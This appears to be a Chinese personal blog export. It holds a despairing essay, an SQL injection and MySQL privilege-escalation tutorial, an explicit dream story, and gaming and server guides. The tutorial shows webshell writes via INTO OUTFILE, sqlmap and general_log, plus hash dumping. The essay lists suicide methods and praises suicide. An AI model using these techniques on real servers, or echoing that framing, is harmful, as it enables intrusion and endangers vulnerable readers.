[{"content":"随笔 感谢信感谢信感谢信……人生顿时黑暗了，可是它本身也未曾光亮过。有过光亮的也是我意淫出来的罢了。我可以在无谓光亮或黑暗的时刻做出无谓是积极或是消极的事，好像本身也无谓光亮或黑暗了。只不过终于碰壁到了无法逃避的程度，所以也就突然意识到了而已。我此前是没有勇气面对这真实的黑暗的，于是我假装它并不，并且享受且坦诚地面对着虚假的光亮，直到恍惚间被一耳光扇醒，呵呵。\n可是勇气呢。为什么我找不到我的勇气了呢，我没有勇气面对，我还有什么呢，我还有什么勇气的。我摸遍了全身上下，也没有找到什么剩余了。你有死亡的勇气吗。我抽烟的时候，总站在阳台往下看，迷迷糊糊仿佛我就要散着烟气往下跳了。我于是攀扶在栏杆上，做出危险的姿势，可是求生的本能还是压过了尼古丁的诱惑。我没有死亡的勇气。我佩服自动求死的人，不论他们是正义的、邪恶的、无病呻吟的。人生中最困难的事就是战胜死亡的恐惧。我懦弱，但大多的人都是懦弱的，如此想来，也没什么。\n轨道上被火车碾死、高楼跃下摔死、服下安眠药烧炭死、投河死、宣泄无能的怒气被处决死，我想过很多窝囊的死亡，我想得无比透彻与无比详细，好像我真的会去做似的。可是我没有勇气，不论是好的、坏的，不论是远的、近的，我都只敢意淫与幻想。死亡亦是。我真的要踏上这种旅程的时刻，细数下来也有三五次，无非是极度恐惧、极度委屈与极度自卑的时候。我把自己想象成没有后路的项羽，让死亡同时降临在我与仇人身上；我还把自己想象成随风飘落的餐巾纸，从朝天门大桥上摇摇晃晃飘入长江；我还把自己想象成一根点燃的香烟，在密闭的浴室里等着一氧化碳把我淹没。可是我只敢想象。\n这么多的日子，不止一次被幻觉勾引，也不止一次高潮。直到醒悟过来才发现只是他妈的梦。今天终于不是梦了，可是这次却没能让我高潮。是感谢信，时隔他妈一个月的感谢信。我操你妈的，这些企业到底要的是什么人？如今最后的盼头也没盼着，所有的念想都化为泡影了，我还有别的事要做吗？我不知道。于是我点了根香烟，来到阳台边，又开始幻想，像烟灰一样没有恐惧地向下飘落，直到风把我吹散。我已经找不到目标了。我不知道接后的生活是什么样子，因为我所幻想、意淫、期盼的未来的路已经断了。剩下的都是未知。究竟是什么样子呢？我憋了一口气，把头没过水面……我只看到水，黑色虚无中的水，绿色诅咒般的水，别无一物纯净的水，或者是秽物充斥的水。我的人生。呵呵。我快窒息了，把头拔出水面。戴上耳机，点根烟，播放一首No surprises，深呼吸，吐口气。我发现我流泪了。泪水掉到这狗操的水中。我的人生，我的人生的水，就是他妈的我的泪。我又想沉下去，把自己溺死在这水里。可是人是无法用自己的泪水溺死自己的。人的生存本能会在他被自己的泪水淹死的时候激发，于是他就没有了泪水。求死而不能，真怪他妈的生存本能。我去他妈的生存本能。我可以舍弃生存本能吗？舍弃了生存本能的人不会流泪。我想，因为这些生物没有情感，操他妈的。真他妈复杂。是梦就好了。梦他妈是好的，梦他妈的不会这么无情。要是我永久停留在有着美好记忆的梦里，该他妈多好。有没有永久驻留在梦里的方法呢？是死亡吗？我去你妈的。\n求死的人，他求死的路上就会高贵么？如果他求死的路上憋不住屎尿屁了，他会先去解决了来再求死么？如果他坐在通向河边的公交车上睡着，发现自己的眼睛被泪水粘住再也无法打开，会觉得烦恼么？如果他必须要徒步几十公里才能去到求死的地方，他能够坚持下去么？求死的都是懦弱的畜生。如果他们有此毅力与理智，何至于把自己引导至死亡呢。我既是畜生，也是懦弱的。可是我没有求死的勇气，于是我未曾踏上求死的路。人在娘的肚子里酝酿发育九个月，从单个细胞，变成一个精密而美丽的复合体。亿万个神经，推进你的思考，牵动着你的肢体。人再没有毅力，也不可能将这具躯壳养成。如果任由一氧化碳侵入，任由火车碾过，任由河水浸入肺部，未免有些残忍了。就好像将油漆破向蒙娜丽莎，用大锤敲碎维纳斯女神像。人体本身就是一件艺术品，如果有人能无耻到摧毁一件如此美丽的艺术品，且他并非该艺术品的创作人，那他必定是个懦弱的畜生。但是人找寻到了破坏的快感。尤其是更加高贵、典雅的作品，将其破坏的快感更是无以伦比。于是他抽烟、喝酒、享乐；于是该艺术品就像蒙尘、风化般，慢慢消逝了。就让我的肉体，如此沉没，消逝罢。\n2024/11/26\n","permalink":"http://3lizabeth.fun/posts/chonglang/6aeec54f120aa13be/","summary":"随笔 感谢信感谢信感谢信……人生顿时黑暗了，可是它本身也未曾光亮过。有过光亮的也是我意淫出来的罢了。我可以在无谓光亮或黑暗的时刻做出无谓是积极","title":"随笔"},{"content":"SQL注入漏洞基础 SQL注入简介 SQL注入顾名思义，就是针对sql语言的一种代码注入技术，计算机难以分清指令与数据，所以在进行查询时，攻击者利用精心构造的SQL语句就可以得到想要的返回数据了。下面引用cloudflare官方文档对SQL注入的介绍\n1 2 3 4 5 6 7 结构化查询语言 (SQL*) 注入是一种代码注入技术，用于修改或从 SQL 数据库检索数据。通过在输入字段中插入专用的 SQL 语句，攻击者可以执行命令，以允许从数据库中检索数据、破坏敏感数据或执行其他操纵行为。 通过正确执行 SQL 命令，未经授权的用户可以伪造特权更高的用户的身份，使自己或其他人成为数据库管理员，篡改现有数据、修改事务和余额以及检索和/或销毁所有服务器数据。 在现代计算中，SQL 注入通常是通过将恶意 SQL 查询发送到由网站或服务提供的 API 端点而在 Internet 上发生的（下文会详细介绍）。在最严重的形式下，SQL 注入可以使攻击者获得对计算机的 root 访问权限，完全掌握控制权。 *SQL 是用于维护大多数数据库的编程语言。 SQL 注入攻击的工作原理 模拟场景 一个法庭，一个名叫 Bob 的男子受审，他即将在法官面前出庭。在庭审前填写文书时，Bob 将自己的名字写成“Bob 可以自由离开”。当法官审理其案件并大声读出“下面传唤的人是‘Bob 可以自由离开’”时，法警放开 Bob，因为法官说他可以自由离开了。\n尽管 SQLi 的各个变版略有不同，但核心漏洞本质上是相同的：本应为特定类型的数据（例如数字）保留的 SQL 查询字段传递了意外的信息（例如命令）。该命令在运行时越过预期的范围，从而允许可能有害的行为。查询字段通常由在网页上输入表单的数据填充。（该例子可以是验证密码的SQL注入实例）\n实际场景 假设一个网站可以输入学生学号，直接查询对应的学生姓名。\n那么假设其后端代码如下\n1 2 studentId = getRequestString(\u0026#34;studentId\u0026#34;); lookupName = \u0026#34;SELECT * FROM students WHERE studentId = \u0026#34; + studentId 可以看到，如果输入学号123456，对应的SQL查询语句就是\n1 SELECT * FROM students WHERE studentId = 123456 如此查询可以返回正确的学生姓名。可是如果攻击者在语句后方拼接恶意代码，就可以越权获取他本不该获取数据了。例如他在网页的学号框中输入123456 OR 1=1，那么查询语句代码就变为\n1 SELECT * FROM students WHERE studentId = 123456 OR 1=1 如此，攻击者就可以获取students表中所有的学生名了，因为 OR 1=1 使得 WHERE 表达式中的值恒为 TRUE。\n危害与利用 危害 最常见的危害就是获取数据库信息了，也就是俗称的拖库。通过不断地枚举获取其数据表与字段，慢慢把数据全部打包带走。有些密码没做加密保护的，甚至还能直接盗取账号窃取凭证。除了获取数据，肯定也能增删改了，不论是大量垃圾数据的填充还是对实际数据的篡改与删除，危害都是很大的。此外，SQL注入有时也能用于提权getshell。\n分类 SQL注入类型很多很杂。\n根据提交参数类型有整形 字符型注入。一般弱类型语言如php asp等会做类型识别，对于异常类型会抛出异常，强类型语言如c# java则一般不存在该类问题。\n根据返回结果也有回显和无回显注入。主要是根据提交数据后有无数据回显，为了方便判断结果，就有报错、时间、布尔盲注等注入方式，前者将结果包裹在报错信息中，后两者则通过布尔值与时间值的回显差异来进行true or false判断。\n根据注入方法还有post\\get\\cookie等等。\nMySQL提权 提权相对来说较为复杂，其危害一般是通过一些方法来获取系统权限，从而接管服务器。\n直接写webshell 目标网站绝对路径 高数据库权限用户 配置文件：load_file() 与 secure_file_prev 配置不当 web目录有写入权限 首先通过语法查看是否存在配置不当\n1 2 3 4 5 6 7 show global variables like \u0026#39;%secure_file_priv%\u0026#39;; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ Value 说明 NULL 不允许导入或导出 /tmp 只允许在 /tmp 目录导入导出 空 不限制目录 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件\n在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件\n如果满足条件，则可以使用SQL语句写入恶意文件\n1 select \u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/info.php\u0026#39;; 使用sqlmap则可以使用以下命令\n1 sqlmap -u \u0026#34;http://x.x.x.x/?id=x\u0026#34; --file-write=\u0026#34;./your_shell.php\u0026#34; --file-dest=\u0026#34;/var/www/html/test/shell.php\u0026#34; 一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。\n重定义日志文件 web目录有写入权限 Windows系统 高权限账户 MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell\n1 2 3 4 5 6 7 8 mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;general%\u0026#39;; +------------------+---------------------------------+ | Variable_name | Value | +------------------+---------------------------------+ | general_log | OFF | | general_log_file | /var/lib/mysql/3liza.log | +------------------+---------------------------------+ 该值默认为OFF，开启它可以记录用户输入的每条命令，会将其保存在对应的日志文件中。\n通过重定义日志文件，向其中写入内容的话就可以将其改写为webshell。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 更改日志文件位置 set global general_log = \u0026#34;ON\u0026#34;; set global general_log_file=\u0026#39;/var/www/html/your_shell.php\u0026#39;; # 查看当前配置 mysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;general%\u0026#39;; +------------------+-----------------------------+ | Variable_name | Value | +------------------+-----------------------------+ | general_log | ON | | general_log_file | /var/www/html/your_shell.php| +------------------+-----------------------------+ # 往日志里面写入 payload select \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;; # 此时已经写到 your_shell.php 文件当中了 虽然写入已经成功了，但是修改该文件的用户是MySQL用户，一般访问时会报错，在Linuxroot下成功率较低，只有在Windows上才稍微好点。\n破解哈希拿root 直接在mysql.user表中存在用户凭证信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # MySQL \u0026lt;= 5.6 版本 mysql\u0026gt; select host, user, password from mysql.user; +-----------+------+-------------------------------------------+ | host | user | password | +-----------+------+-------------------------------------------+ | localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | ::1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | | % | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | +-----------+------+-------------------------------------------+ # MySQL \u0026gt;= 5.7 版本 mysql \u0026gt; select host,user,authentication_string from mysql.user; +-----------+---------------+-------------------------------------------+ | host | user | authentication_string | +-----------+---------------+-------------------------------------------+ | localhost | root | *8232A1298A49F710DBEE0B330C42EEC825D4190A | | localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | | localhost | mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | +-----------+---------------+-------------------------------------------+ 简单的hash可以直接破解，复杂一点的也可以用hashcat跑\n历史漏洞 太老了，不想写了，简单列一下\nyaSSL缓冲区溢出： 08年曝出的MySQL yaSSL SSL Hello Message Buffer Overflow\nCVE-2012-2122： 多次登录失败有几率直接登录进入数据库\nUDF提权 UDF(User Defined Function)， 用户自定函数。用户可以自定义函数，来实现一些更加方便的和复杂的操作。可以在SQL语句中像直接调用version()那样调用该自定函数。\n在MySQL\u0026gt;=5.1的版本，需要将udf的dll\\os文件放到MySQL安装目录里下的lib\\plugin\\下才能创建自定义函数。\nsqlmap与msf都集成了一些dll\\os文件。比如sqlmap/data/udf/mysql\nsqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：/extra/cloak/cloak.py\n使用该命令来解码：\n1 python3 cloak.py -d -i ./lib_mysqludf_sys.dll_[输入] -o ./lib_mysqludf_sys_64.dll[输出] 而msf的动态链接文件无需解码，存放在msf/embedded/framework/data/exploits/mysql，据说两者的动态链接库文件一模一样。。。\n那么将动态链接文件放入plugin目录即可，使用以下命令查看目录\n1 2 3 4 5 6 mysql\u0026gt; show variables like \u0026#39;%plugin%\u0026#39;; +---------------+------------------------------+ | Variable_name | Value | +---------------+------------------------------+ | plugin_dir | /usr/local/mysql/lib/plugin/ | +---------------+------------------------------+ 如果没有该目录，则可以先获取MySQL安装目录，再手动创建进去\n1 2 3 4 5 6 mysql\u0026gt; select @@basedir; +------------------+ | @@basedir | +------------------+ | /usr/local/mysql | +------------------+ https://www.sqlsec.com/2020/11/mysql.html#%E5%8F%8D%E5%BC%B9%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83\n漏洞防护 总结 ","permalink":"http://3lizabeth.fun/posts/study/sql_basic/","summary":"SQL注入漏洞基础 SQL注入简介 SQL注入顾名思义，就是针对sql语言的一种代码注入技术，计算机难以分清指令与数据，所以在进行查询时，攻击者","title":"sql注入漏洞基础"},{"content":"秋叶未落，夏日仍烈 \u0026mdash; 2024秋招 今年年初的我其实还特别上进。主动投递简历，寻求日常实习，也多亏了地缘优势和收留，我在网宿待了三个月，从无聊而繁琐的校园课程中脱出身来。虽说所做之事无甚传颂，但好在有了学习的环境和理由，我自认为成长还是快速的。于是持续上进的我继续寻求机会，暑期也算有了着落。自以为揣着两份实习经历的我，在秋招不说速通，至少是能上岸的。但秋招的雨点远比我想的粗大。\n笔试是无法逃避的；若是专业笔试也就罢了，我最烦行测笔试与AI面试，两者无非是简历初筛的一个稳兵之计，方便争取更多时间筛掉潜规则不达标的简历，而这潜规则便是学历、学校之类的因素。烦但我又不得不做，于是被迫做了好多图表分析、逻辑、心理测试题。然而等待我的也几乎都是流程终止、或是永无止尽的评估。\n初遭碰壁后，我很快就认清现实了。在学历鸿沟面前，你甚至很少能挤进面试。再不提大开胃口的我投的大多都是甲方（但乙方开放秋招的也比较少），简历包装得再精美，八股不过关、项目不够深，只能拿到经验包。\n但为何我没有一边提升自己一遍投递简历准备秋招呢，我也时常问过我自己，为什么再拿不出年初的激情与动力呢。我发现我已经渐渐失去了这一切，变作一具行尸走肉了。自从北京返校后，我几乎再没进行过技术上的实操学习了。有的只是各个地方推送到脸上的技术文章，云一遍便假装学习了。刚返校那会我还拟定了一份计划表，打算学+投+健身一把抓，但几乎都失败了。大四课表稀疏，而我又正是怕清闲的，若是大一大二还好，但我已经大三，在这个时间点上，我很难不主动去逃离清闲。然而我似乎却丧失勇气与动力了。每日无非是正午起床，然后重复昨日的颓废。我忽地发现返校后我的抽烟频率提高了，往日一周一包过过瘾，到现如今两三天一包，有事无事总往阳台跑——既是逃离现实，也是无所事事的展现。每次抽烟至少都是三根起步，然后蔫着身子回到电脑前，我完全无法集中注意力了。\n如山般叠起来的废旧的烟盒，撑得膨胀的用过的抽纸包，我已经是肉眼可见的颓废了。和朋友家人通通电话排解心情，但我几乎只是单方面宣泄，而未曾做出什么改变。家里一时半会支不出生活费，每日大吃大喝饱一顿饥一顿，连家人朋友也都看出我下巴日渐肥厚的肉了，暑期实习的工资也一点一点快要被我花完，我的颓废生活何时是个头呢。\n暂且不提offer，就算是面试我都没几个。而看着朋友们一手一个入职信，我只能侧旁膜拜，像意淫我的爱情一样，意淫我的事业。与我一般遭遇的，也有几个。同学的秋招也拿不出成绩，还有一哥们放弃了秋招，还有高中同学考研破防重回秋招。但他们却付着比以往更深的努力向着更好的路走去。或许我不是最没希望的那个，但我一定是最颓废的那个。\n我发现人与人之间的坦诚也似乎消失了。我那一日之情的同事，又在对我吹嘘他那好几个offer。他什么水平我或许清楚，但他什么运气我不清楚。他的简历我看来甚是好笑，造假能力且不提，自信力我倒是不得不提，敢往自己简历里写曾挖到过微软官网RCE的他是我见过的第一人。教培机构，为期一天和为期半个月的实习，也被他写出花来。坦诚是人与人交往最基本的要求。若是真有实力也就罢了，但他明显面临跟我一样的苦境。果真如此我们尚且可以一起交流，分享秋招经历。但非得故作高手，维持你的人设，那我也没辙了。\n或许只是我太过颓废，加之本身技术有限，又不知进步，才迟迟游不上岸。或许我真该好好收收心，虽说尚有春招，但眼下秋招仍没结束，这依旧是我最该把握与拿捏住的了。\n","permalink":"http://3lizabeth.fun/posts/articles/autumn_2024/","summary":"秋叶未落，夏日仍烈 \u0026mdash; 2024秋招 今年年初的我其实还特别上进。主动投递简历，寻求日常实习，也多亏了地缘优势和收留，我在网宿待了三个月，从无聊而","title":" 秋叶未落，夏日仍烈 --- 记2024秋招"},{"content":"老滚5联机服务器搭建（基于centos Linux与上古卷轴5十周年版） 简介 早在2022年，skyrim reborn就可以支持中型上古卷轴5联机玩法了；那时我和朋友通过整合包在游侠平台上玩耍过一番，但是功能稍有缺失，bug也有点多，体验了一下午就没有再打开了。最近才了解到最新的skyrim together reborn已经迭代得十分稳定了，并且几乎支持绝大部分mod拓展。\n国庆的时候已经体验游玩过了，大致感受是：十分稳定，几乎没有出现过掉线的情况；少有卡死闪退的情况；个别特殊任务不“支持”联机（比如黄金龙爪，只有一个龙爪咋可能让多个人交任务）\n该ｍｏｄ工具可以自行查看公共服务器（有很多空服务器，可以进去体验一下，国外服务器可能比较卡）\n搭建的服务器不做游戏数据托管，只做联机时玩家之间的数据交换，所以对服务器要求不高（不同于cs、mc），我的服务器2核2g流畅运行。\n参考资料 1 2 3 4 5 6 7 官方手册（有着一切介绍、问题与解释） https://wiki.tiltedphoques.com/tilted-online 联机 mod 安装 https://www.youtube.com/watch?v=7ogIhWUxPyE 基于Linux docker 搭建上古卷轴5联机服务器 https://wiki.tiltedphoques.com/tilted-online/guides/server-guide/linux-setup/docker-setup 前提 Skyrim 周年版（steam直接下载的就是）（先提前启动steam版，完成周年版内容更新） Skyrim together mod 拓展 （联机mod） MO2 （用于管理mod） 蛤蟆吃或个人服务器 本地玩家 安装mod 傻瓜式教程（如果你都会Linux指令了，那么按图安装mod真的是傻瓜式了）\nhttps://www.bilibili.com/opus/681375700968538133?spm_id_from=333.999.0.0\n主要是涉及到目录、指定运行文件、启用mod之类的操作\n联机mod打包\nhttps://www.alipan.com/s/HiEMQSPsp3E\nexe解压，解压密码8888\n配置MO2路径、启动文件即可\n云服务器搭建 使用docker可以傻瓜式搭建，但今年六月docker全面被强。本人在此卡了很久\nDocker的安装\n可以参考本人的另一篇文章，如何安装docker，本文章还讲了clash的代理配置，但我配置了代理且能成功curl google的情况下依旧无法pull image。。\nhttp://3lizabeth.fun/posts/study/server_basic_build/\n创建映射目录 创建并运行容器时，会将容器内的配置文件映射到本地（如此，你就可以在本地真实的物理环境中修改配置文件，无需exec到容器内部）\n/opt/docker/skyrimserver 即配置文件目录，一般而言修改服务器配置文件只需要cd到config，修改里面的.ini文件即可\n1 sudo mkdir -p /opt/docker/skyrimserver/{config,Data,logs} 拉取并运行镜像 拉取镜像并直接运行，但需要注意，如果没有解决docker 代理拉取镜像的问题，请使用https://dockerproxy.net/进行proxy代理下载（原始镜像为tiltedphoques/st-reborn-server:latest）\n如果你懒得查看该网站（已经很详细了）\n可以直接使用下面代码\n拉取代理镜像\n1 docker pull dockerproxy.net/tiltedphoques/st-reborn-server:latest 重命名镜像\n1 docker tag dockerproxy.net/tiltedphoques/st-reborn-server:latest tiltedphoques/st-reborn-server:latest 删除代理镜像\n1 docker rmi dockerproxy.net/tiltedphoques/st-reborn-server:latest 然后直接运行容器 如有需求，可以更换映射端口，只要把10578:10578改为X:10578（X为你自定义的端口） 请记得打开对应端口，协议为udp 如果你解决了docker的代理问题，你也可以跳过上面三行代码，直接输入下面代码\n1 docker run -d -it --name skyrimserver -p 10578:10578/udp -v /opt/docker/skyrimserver/config:/home/server/config -v /opt/docker/skyrimserver/Data:/home/server/Data -v /opt/docker/skyrimserver/logs:/home/server/logs tiltedphoques/st-reborn-server:latest 修改配置文件 如果成功启动了容器，\n使用docker ps -a查看其是否正在运行。检查无误后，连接服务器就架设成功了\n如果要修改配置文件怎么做呢\n先停止容器运行\n1 docker stop -t 1 然后编辑配置文件，记得sudo提权，（没有vim就用vi，或者干脆下一个）\n1 sudo vim /opt/docker/skyrimserver/config/STServer.ini 配置文件属性与值的具体含义参考官方文档\nhttps://wiki.tiltedphoques.com/tilted-online/guides/server-guide/server-configuration\n修改完毕后保存，再次运行容器即可生效\n1 docker start skyrimserver 进游戏后，Ｆ２打开联机控制台，输入 服务器IP地址:端口 与密码 （如有）即可进入服务器了\n问题 安装的问题 游戏版本记得一致，打开steam游戏目录，右键exe查看属性，可以看到版本号，官方十周年周年版应该是1.6多？记得使用官方英文版！！！汉化再自行安装\n游玩的问题（只测试了双人游玩） mod可以稍微不一样，比如服装、武器之类的。如此，没有安装对应mod的人就看不到你穿的衣服或拿的武器\n环境问题：当高等级玩家进入副本某场景时，遇到的是巨魔，而低等级遇到的则是普通尸鬼等等，在高等级玩家视角里，低等级玩家被巨魔狂追，但无法造成伤害。在低等级玩家视角里，并没有巨魔，也没有伤害。。\n任务问题：只有一个黄金龙爪，若A拿走了，B无法再获取龙爪。如此，Ａ可以完成该任务，但B就卡任务了\n总结 最好保持玩家等级、ｍｏｄ一致\n最好一个玩家用初始档，从零开始玩；其他玩家使用完全档（完全不接任务，只跟随初始档玩家游玩）\n","permalink":"http://3lizabeth.fun/posts/study/skyrimreborn/","summary":"老滚5联机服务器搭建（基于centos Linux与上古卷轴5十周年版） 简介 早在2022年，skyrim reborn就可以支持中型上古卷轴5联","title":"搭建自己的老滚5联机服务器---SkyrimTogether:reborn"},{"content":"出租屋告别 2024/9/12\n​\t缭绕的雾，从浴室里散出来，似那氤氲仙气。她又从里面缓缓走出，用白色浴袍包裹其身，扭着头拍打着长发上的水珠。她就在我隔壁房间，在我俩的房门都打开的情况下，我甚至能直接看见她的胴体，在黄色的灯光下撩撩闪现。这才刚搬进来没多久，我就要离开了，无非是因为工作上的琐碎与苦气，终于冲破了我忍耐的极限。这就要离开了，甘心就此留下遗憾么，大胆一次，暂且不为何，只是尝试罢。我敲响了她的房门。来拿门的她，形象依旧和刚出浴的她一般，高洁而美丽。 ​\t“不久我就要离开了，可是还没有和你说过话，我觉得好亏。”她见我也不嫌，听罢就问道：“哈哈，有这般离谱吗。你是怎的要离开了？” ​\t“工作烦心而已。我此番只是想和你说说话，不然让我们相遇的缘分就散尽未免也太平凡了。” “进来罢！”她把门拉开，侧身迎我进去。穿过时只闻到了仙飘飘的香味，再然后就是“啪————”的关门声。我不客气，直接坐在软塌的床上。“你的房间，好乱。”她的房间很粗犷，有如跑马的草场，乱糟糟看得人困意十足，完全不似她的布置。“一直都是我一人住，也没有打理的必要。你还是第一个来访的。”她则视我如无物般，大大咧咧的冲趴在床上，而后方才转背起身。我也是在这才看清她的面貌。说来惭愧，如此几月的合租岁月，我竟没能看清，抑或说没能鼓足勇气直视她的容颜。仅是十步之外的窥视，亦能使我心率陡增，只得转过头去。但如此这下，我才有绝佳的面对她的机会；我这第一次看清她的脸了，但不知是今日，还是每日，她下眼上满是黑眼圈，但看脸来，却是无神且无光，俨然一副衰疲黯淡样，而整体看来却又看出些欣欣向荣，莫名的活力来了。我装作双目无神地瞥视，其实早已是直勾勾地盯着她，像学生第一次研究月陨那般贪婪地扫视着每一个沟壑与斑点。她侧着我把头发拆散开来，似电影里那般神圣纯洁。昏暗的泛黄灯光下，皮肤也不知是白是黄，几乎与刚没过胸的浴巾，要一般同色了。贴身的浴袍，又似那紧身的长裙，令我浮想联翩。 ​\t估摸是刚洗完澡，身上还带着热气，房间内便浓浓散发着一股不知觉的气氛。“也怪我生性孤僻，也找不到甚么个话题与你交谈。其实我只是想再多看看你。”不知带着哪来的勇气，我竟说出这话来。“你倒不必自责，其实这么久合租日，我也有关注过你。每天出去得早，回来得晚，想必工作也是一番受气；看你也是拼搏年纪，闯它一闯又无妨，只是别累着自己。我曾也与你这般好像，只是最后逃了出来，不再与那生活作斗争。”说罢，她就握住我一只手，在这昏暗之房，竟直乎乎与我对视起来。我向来怕与女人对视，如此竟像是触电般想要收回手来，却不知为何顺从了。虽也强行坚持与她对视，但就好像初学书法的小孩子一般，双眼就像捉笔似的飘忽不定，似逃非逃。我也不知对视了多久，她就拉着我手，将二人拉近得几乎要贴近了，然后将头靠上来。是一个拥抱，但是却又带着溺与爱在里，就跟妈妈抱住孩子般宠溺一般。虽然好是一副温馨放松的写照，但我却僵直万分。犹豫分秒后，我也不再胆怯，与她相拥了。我万分确信这是做梦了。 ​\t她轻笑，一脚踢下二人的拖鞋，将我们都拖上床，伴着不知从何而起的热气，在这般昏暗之中像胶水般缠住二人缠绵起来。我们都像饿慌了的捕食者，在对方身上寻找着什么，连舔带咬，不曾放过一寸肌肤。浴巾不知怎的解了，褪下一只裸体来，在这奄奄一息的灯光里，格外的诱人。我模糊看见几处年代感久远的纹身，而后就是各自发力，起伏与抽插，双眼已自然享受地闭合，再无精力仔细看向彼此了。她的肌肤似乎有点不再有弹性，但仍光滑水润，滚烫异常。时间过得很快，热气还没散去，空气却也不只有热气了，荷尔蒙乱撞着，奇异的气味扑腾着，有气无力的黄色灯光下，两人扭动的身子，映照出一副光怪陆离的交织碰撞之影。喘息声停下，而后两声火机的声音响了。空气又弥漫着白烟。我看向她的床头柜，拿起一张卡，见其上面写着“1990年”。 ​\t“你依旧住这吗？”我拿着卡，问她。 ​\t“很久————依旧住这。”她先吸一口，说完上半，再说下半。 ​\t“你不必走的。”没等我继续发问，她又接上。“我们往后便一起生活。我一直蛮喜欢你的。” ​\t这梦还没结束么，事到如此，我也不躲闪了。 ​\t“你可知这合租以来，我有多么欲求于你么。你倒好，竟说出这般话来，教我往日的岁月如何相信。” ​\t“哈哈，这不正如了你所愿么，你年轻尚且有气力，我年虽长你十来岁，却倒有些经验与门道，二相竞合，不是甚好。” ​\t我们正敲定签约，门外却传来郑定的脚步来。这才想起房里另一位租客。我们三人曾不有任何交情，就连面相都记不太甚清。我对他别无印象，也不无道理，只怪他的确太过平凡，无一点脱凡之气。就是小说里的路人乙，仅是路过，起个调节小说节奏的作用，而无他用。他准是听见了我与她在她的屋里谈话了，内容或许不知，但两位平日冷淡的室友，此刻竟同入一道门了，我倒是替他感到震惊。但不论如何，话是交代完了，我也是得回自己屋了。此刻出门必然撞上他，但也正好让我逃离这梦境般的地方。 ​\t可刚出门，却看到的是他冷冷的一窥。这一窥冷到极致，好像射出了兵刃一样，穿透了我的身体。此番那热情洋溢的床上对战来带的灼热感瞬间褪去。但我也无法分清是他这一窥，又抑或本是外边走廊的冷气。他快速地窥了我与身后的她的房间一眼，便迅速收回，没有言语。空气冷得令人发指。被这冷冽的气氛一点，我似也有不祥的预感，便匆匆回了自己房间了。 ​\n","permalink":"http://3lizabeth.fun/posts/chonglang/dream_1/","summary":"出租屋告别 2024/9/12 ​ 缭绕的雾，从浴室里散出来，似那氤氲仙气。她又从里面缓缓走出，用白色浴袍包裹其身，扭着头拍打着长发上的水珠。她就在我隔壁房间，在","title":"记梦，其一"},{"content":"云服务器搭建 Teamspeak 服务 Teamspeak Teamspeak是我从中学以来就一直使用的多人语音通信工具。相比于YY，其轻便简洁；相比于kook（盗版discord的那个），其绿色纯净；相比于QQ微信等，其降噪功能强大。此外，teamspeak还有搭建方便、安全性高、拓展性强、职业认证（CS2 DOTA2 职业哥都在用！）等数不清的优点。我和群友们也搭建过、购买过许多次ts服务器了，不论是聊天摆阔还是游戏交流，几乎一有事就在群里发“上ts”，然后齐聚ts。\n如果你也想使用自己的ts服务器，可以通过购买官网服务器，直接使用（较贵）；也可以某宝购买三方服务器（较便宜）；当然如果有自己的服务器，也可以搭建在服务器上。\n以下为官网介绍\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Teamspeak 作为专业游戏玩家的第一选择是有原因的。 且不说我们提供的最佳语音质量。且不说我们提供军用级安全性、 作为 TeamSpeak 用户，我们知道您期待得到最好的解决方案。 TeamSpeak 的真正不同之处在于，您处于完全掌控地位。 与其他解决方案不同，我们不会强迫您使用我们的集中式服务器。我们会不收集您的数据，然后将其出售。我们不会告诉您事情应该如何处理或如何解决。 这全凭您的选择。我们让您决定。 **TeamSpeak。您的团队， 由您做主。** 前提 需要有服务器公网IP，一般都会自带。自行挂代理，ts官网疑似不能裸连（没试过）\n下载 百度搜索出来的前面几条很可能是国产的盗版Teamspeak网站\u0026ldquo;teamspeak中文站\u0026rdquo;，前域名ts3.cn，现域名ts3.com.cn。需要注意别下错了。\n图为盗版ts\n使用官方下载链接（挂代理）teamspeak.com\n1 2 3 4 5 6 7 8 https://www.teamspeak.com/zh-CN/downloads/#server 下载Server Linux版本，将其保存在桌面，而后通过xftp直接上传至服务器(或者直接在服务器上用命令下载) 64位 wget https://files.teamspeak-services.com/releases/server/3.13.7/teamspeak3-server_linux_amd64-3.13.7.tar.bz2 或 curl -O https://files.teamspeak-services.com/releases/server/3.13.7/teamspeak3-server_linux_amd64-3.13.7.tar.bz2 解压、创建用户、赋权 得到压缩包后，进行解压\n1 sudo tar -xvf teamspeak3-server_linux_amd64-3.13.7.tar.bz2 解压后，重命名文件夹，并移动至/home目录\n1 2 3 sudo mv teamspeak3-server_linux_amd64 teamspeak sudo mv teamspeak /home cd /home/teamspeak 为了安全考量，teamspeak官方不推荐使用root用户运行 teamspeak 服务，同时也为了方便管理，这里我们创建一个新的用户 teamspeak\n到新的 teamspeak 目录后，创建用户\n1 2 3 sudo useradd teamspeak sudo useradd teamspeak [密码请使用强密码] 然后以管理权限为teamspeak用户赋予teamspeak文件夹权限\n1 chown -R teamspeak:teamspeak /home/teamspeak/ 